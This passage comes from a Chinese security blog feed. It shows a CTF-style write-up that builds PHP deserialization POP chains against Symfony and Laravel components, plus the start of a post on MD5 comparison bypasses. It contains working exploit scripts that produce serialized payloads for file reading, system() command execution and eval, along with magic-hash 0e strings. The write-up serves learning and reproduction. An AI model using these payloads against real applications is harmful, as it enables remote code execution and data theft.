&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">PhpArrayAdapter&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$file&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;/flag&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">TagAwareAdapter&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$deferred&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$pool&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">deferred&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;amiz&amp;#39;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">CacheItem&lt;/span>&lt;span style="color:#111">());&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">pool&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">PhpArrayAdapter&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">$a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">TagAwareAdapter&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">urlencode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$a&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="链子2---rce">链子2 - rce&lt;/h2>
&lt;p>回到前面在相同命名空间下找&lt;code>saveDeferred()&lt;/code>的地方，还有另一个类也有同样的方法 vendor/symfony/symfony/src/Symfony/Component/Cache/Adapter/ProxyAdapter.php&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204102722908.png" alt="image-20211204102722908">&lt;/p>
&lt;p>跟进&lt;code>doSave()&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204102953831.png" alt="image-20211204102953831">&lt;/p>
&lt;p>223行可以动态调用函数，&lt;code>setInnerItem&lt;/code>可控 我们可以调用&lt;code>system()&lt;/code>，接下来确认它调用的两个参数可不可控&lt;/p>
&lt;p>对于&lt;code>$item&lt;/code>，是调用函数&lt;code>doSave()&lt;/code>函数时传入的参数，也就是&lt;code>saveDeferred()&lt;/code>时的参数，也就是我们传入的数组，可控&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204103425511.png" alt="image-20211204103425511">&lt;/p>
&lt;p>对于&lt;code>$innerItem&lt;/code>有这样一个if判断&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204103829313.png" alt="image-20211204103829313">&lt;/p>
&lt;p>光看这个判断肥肠的突兀，还要结合207行的&lt;code>$item = (array) $item;&lt;/code>，它将一个类强行转换成数组，而后面跟着的这个if判断就是为了解决类中原有的 &lt;em>protected&lt;/em>的属性冲突，所以需要在相同的命名空间里接着找一个类，包含&lt;code>pollHash&lt;/code>和&lt;code>innerItem&lt;/code>属性，最终还是找到了CacheItem（前面也是它&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204104546506.png" alt="image-20211204104546506">&lt;/p>
&lt;p>构造exp&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Symfony\Component\Cache&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">CacheItem&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$expiry&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$poolHash&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$innerItem&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$expiry&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$poolHash&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$command&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">expiry&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$expiry&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">poolHash&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$poolHash&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">innerItem&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$command&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Symfony\Component\Cache\Adapter&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">ProxyAdapter&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$poolHash&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$setInnerItem&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$poolHash&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$func&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">poolHash&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$poolHash&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">setInnerItem&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$func&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">TagAwareAdapter&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$deferred&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[];&lt;/span>
&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$pool&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$deferred&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$pool&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">deferred&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$deferred&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">pool&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$pool&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$cacheitem&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Symfony\Component\Cache\CacheItem&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;dir&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$proxyadapter&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Symfony\Component\Cache\Adapter\ProxyAdapter&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;system&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$tagawareadapter&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Symfony\Component\Cache\Adapter\TagAwareAdapter&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$cacheitem&lt;/span>&lt;span style="color:#111">),&lt;/span>&lt;span style="color:#111">$proxyadapter&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">urlencode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$tagawareadapter&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>本地尝试一下（懒得再开靶机了w&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204104738527.png" alt="image-20211204104738527">&lt;/p>
&lt;p>成功了捏&lt;/p>
&lt;h2 id="链子3---rce">链子3 - rce&lt;/h2>
&lt;p>在 &lt;strong>[CISCN2019 总决赛 Day1 Web4]Laravel1&lt;/strong>这道题里赵师傅把这条路堵死了，但是本地复现无所谓啦&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204105214847.png" alt="image-20211204105214847">&lt;/p>
&lt;p>把这个注释取消即可&lt;/p>
&lt;p>看到它调用了&lt;code>events&lt;/code>的&lt;code>dispatch&lt;/code>方法，跟上面思路一样，接着找一个可用的别的类里的&lt;code>dispatch&lt;/code>，比如vendor/laravel/framework/src/Illuminate/Bus/Dispatcher.php&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204110831694.png" alt="image-20211204110831694">&lt;/p>
&lt;p>看一下第一个判断的返回时调用的&lt;code>dispatchNow()&lt;/code>是什么&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204133634260.png" alt="image-20211204133634260">&lt;/p>
&lt;p>150行有亮点啊，使用了&lt;code>call_user_func&lt;/code>，第一个参数可控，第二个参数来自&lt;code>$command&lt;/code>，也就是最开始找的析构函数调用的&lt;code>$this-&amp;gt;event&lt;/code>；现在要找一个类 可以执行任意函数作为第一个参数，然后我们的rce命令作为第二个参数传入，完成整个链子&lt;/p>
&lt;p>不过先不急，首先要满足&lt;code>dispatch()&lt;/code>中的if判断&lt;code>$this-&amp;gt;queueResolver &amp;amp;&amp;amp; $this-&amp;gt;commandShouldBeQueued($command)&lt;/code>，前一个可控，看看后面这个&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204132803262.png" alt="image-20211204132803262">&lt;/p>
&lt;p>需要&lt;code>$command&lt;/code>必须是一个实现了&lt;code>ShouldQueue&lt;/code>接口的类，找到这个 vendor/laravel/framework/src/Illuminate/Foundation/Console/QueuedCommand.php&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204133133796.png" alt="image-20211204133133796">&lt;/p>
&lt;p>然后接着找适合做&lt;code>call_user_func()&lt;/code>第一个参数的类，它需要可以执行任意函数 vendor/mockery/mockery/library/Mockery/Loader/EvalLoader.php&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204135811389.png" alt="image-20211204135811389">&lt;/p>
&lt;p>这个&lt;code>load()&lt;/code>可以直接调用eval执行代码，但是&lt;code>$defination&lt;/code>要满足if的判断，跟进&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204140231175.png" alt="image-20211204140231175">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204140248303.png" alt="image-20211204140248303">&lt;/p>
&lt;p>需要额外再找两个类，第一个类具有&lt;code>code&lt;/code>属性，第二类又&lt;code>getName&lt;/code>函数，来作为第一个类的config属性&lt;/p>
&lt;p>可用的第一个类就是&lt;code>getClassName()&lt;/code>所在的类 vendor/mockery/mockery/library/Mockery/Generator/MockDefinition.php&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204140502311.png" alt="image-20211204140502311">&lt;/p>
&lt;p>第二个是 vendor/nikic/php-parser/lib/PhpParser/Node/Scalar/MagicConst/Line.php&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204140537312.png" alt="image-20211204140537312">&lt;/p>
&lt;p>总结以上的过程，写exp&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">PhpParser\Node\Scalar\MagicConst&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Line&lt;/span> &lt;span style="color:#111">{}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Mockery\Generator&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">MockDefinition&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$config&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$code&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$config&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$code&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">config&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$config&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">code&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$code&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Mockery\Loader&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">EvalLoader&lt;/span>&lt;span style="color:#111">{}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Illuminate\Bus&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Dispatcher&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$queueResolver&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$queueResolver&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">queueResolver&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$queueResolver&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Illuminate\Foundation\Console&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">QueuedCommand&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">$connection&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$connection&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">connection&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$connection&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Illuminate\Broadcasting&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">PendingBroadcast&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$events&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$event&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$events&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$event&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">events&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$events&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">event&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$event&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$line&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">PhpParser\Node\Scalar\MagicConst\Line&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">$mockdefinition&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Mockery\Generator\MockDefinition&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$line&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;lt;?php phpinfo();?&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$evalloader&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Mockery\Loader\EvalLoader&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">$dispatcher&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Illuminate\Bus\Dispatcher&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$evalloader&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;load&amp;#39;&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#111">$queuedcommand&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Illuminate\Foundation\Console\QueuedCommand&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$mockdefinition&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$pendingbroadcast&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Illuminate\Broadcasting\PendingBroadcast&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$dispatcher&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$queuedcommand&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">urlencode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$pendingbroadcast&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>执行效果（盖了一层laravel报错的底色哈哈哈哈哈哈哈&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204140752165.png" alt="image-20211204140752165">&lt;/p>
&lt;p>这个链子非常的长，涉及到6个类&lt;/p>
&lt;hr>
&lt;p>pop链杀我！！！看代码有种目害的感觉了&lt;/p>
&lt;hr>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
以下是本文中涉及到的 和我学习时看过的所有文章的链接🔗 每日感谢互联网的丰富资源（
&lt;/h4>
&lt;/summary>
&lt;p>&lt;a href="https://hachp1.github.io/posts/Web%E5%AE%89%E5%85%A8/20190906-laravel_pop1.html#%E5%A4%8D%E7%8E%B0-1">Laravel POP链简析 &lt;/a> | &lt;a href="https://xz.aliyun.com/t/5911">Laravel5.8.x反序列化POP链&lt;/a>&lt;/p>
&lt;/details></description></item><item><title>md5比较常见绕过小结</title><link>https://amiaaaz.github.io/2021/12/03/bypass-md5-or-sha1-compare/</link><pubDate>Fri, 03 Dec 2021 00:24:56 +0800</pubDate><guid>https://amiaaaz.github.io/2021/12/03/bypass-md5-or-sha1-compare/</guid><description>&lt;blockquote>
&lt;p>&lt;strong>&lt;u>写在开头：&lt;/u>&lt;/strong>&lt;/p>
&lt;p>&lt;strong>&lt;u>别纠结&lt;/u>&lt;/strong>&lt;/p>
&lt;p>&lt;strong>&lt;u>左侧的符号反转&amp;amp;标题是中文引号&amp;amp;有些符号消失&lt;/u>&lt;/strong>&lt;/p>
&lt;p>&lt;strong>&lt;u>的问题&lt;/u>&lt;/strong>&lt;/p>
&lt;p>&lt;strong>&lt;u>我也很无语&lt;/u>&lt;/strong>&lt;/p>
&lt;p>&lt;strong>寄。&lt;/strong>&lt;/p>
&lt;/blockquote>
&lt;hr>
&lt;ul>
&lt;li>
&lt;pre tabindex="0">&lt;code>md5(array()) = md5(NULL) = d41d8cd98f00b204e9800998ecf8427e
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>sha1绕过和md5绕过方式是一样的&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h2 id="md5amd5b--ab">md5($a)==md5($b) &amp;amp;&amp;amp; $a!=$b&lt;/h2>
&lt;p>数组绕过&lt;/p>
&lt;pre tabindex="0">&lt;code>?a[]=1&amp;amp;b[]=2
&lt;/code>&lt;/pre>&lt;p>0e绕过&lt;/p>
&lt;pre tabindex="0">&lt;code>IHKFRNS -&amp;gt; 0e256160682445802696926137988570
QLTHNDT -&amp;gt; 0e405967825401955372549139051580
QNKCDZO -&amp;gt; 0e830400451993494058024219903391
3908336290 -&amp;gt; 0e807624498959190415881248245271
4011627063 -&amp;gt; 0e485805687034439905938362701775
4775635065 -&amp;gt; 0e998212089946640967599450361168
0e215962017 -&amp;gt; 0e291242476940776845150308577824
aabg7XSs -&amp;gt; 0e087386482136013740957780965295
aabC9RqS -&amp;gt; 0e041022518165728065344349536299
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>0e251288019 -&amp;gt; 0e874956163641961271069404332409
240610708 -&amp;gt; 0e462097431906509019562988736854
&lt;/code>&lt;/pre>&lt;p>md5碰撞&lt;/p>
